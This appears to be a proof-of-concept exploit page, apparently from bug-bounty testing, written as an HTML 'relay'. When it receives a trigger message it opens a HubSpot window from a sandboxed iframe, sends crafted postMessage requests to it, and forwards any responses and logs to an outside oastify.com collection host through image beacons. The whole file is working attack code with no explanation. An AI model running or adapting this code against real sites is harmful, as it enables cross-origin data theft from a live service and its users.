<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay Active</h1>
<div id="status" style="font-family:monospace;font-size:12px;"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
const status = document.getElementById('status');

function log(msg) {
    status.innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

log('relay_loaded');

window.addEventListener('message', function(e) {
    const msgStr = JSON.stringify(e.data).substring(0, 200);
    log('MSG_FROM=' + e.origin + '_DATA=' + msgStr);
    
    if (e.data && e.data.action === 'startExploit') {
        log('EXPLOIT_TRIGGERED');
        
        // Using srcdoc instead of data URI
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        iframe.srcdoc = `
<h2>Sandbox Active</h2>
<div id="log" style="font-family:monospace;font-size:12px;background:#000;color:#0f0;padding:10px;"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    document.getElementById('log').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?s=' + encodeURIComponent(msg);
}

log('sandbox_running');
log('origin=' + window.origin);

try {
    let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');
    
    if (!hub) {
        log('popup_blocked');
    } else {
        log('popup_opened');
        
        let attempts = 0;
        let checker = setInterval(() => {
            attempts++;
            
            try {
                let test = hub.origin;
                if (attempts % 10 === 0) log('polling_' + attempts);
            } catch(e) {
                clearInterval(checker);
                log('hubspot_loaded_after_' + attempts);
                
                window.addEventListener('message', function(resp) {
                    log('RESPONSE_from=' + resp.origin);
                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 300));
                });
                
                setTimeout(() => {
                    log('sending_exploit_1');
                    hub.postMessage({
                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                        commandId: 'exploit123',
                        featureId: 'test',
                        parameters: {},
                        resultCount: 1,
                        language: 'en',
                        objectId: '46962361',
                        applicationId: 'crm',
                        basePath: '/',
                        maxPollingAttempts: 1,
                        pollingInterval: 100
                    }, '*');
                }, 1000);
                
                setTimeout(() => {
                    log('sending_exploit_2');
                    hub.postMessage({
                        type: 'raw',
                        _callbackId: 'x',
                        body: {action: 'getData', portalId: '46962361'}
                    }, '*');
                }, 2000);
            }
            
            if (attempts > 100) {
                clearInterval(checker);
                log('timeout');
            }
        }, 100);
    }
} catch(err) {
    log('ERROR=' + err.message);
}
</` + `script>
        `;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('SANDBOX_ADDED');
    }
});

if(window.opener){
    log('has_opener');
    window.opener.postMessage({status:'ready'},'*');
} else {
    log('no_opener');
}
</script>
</body>
</html>
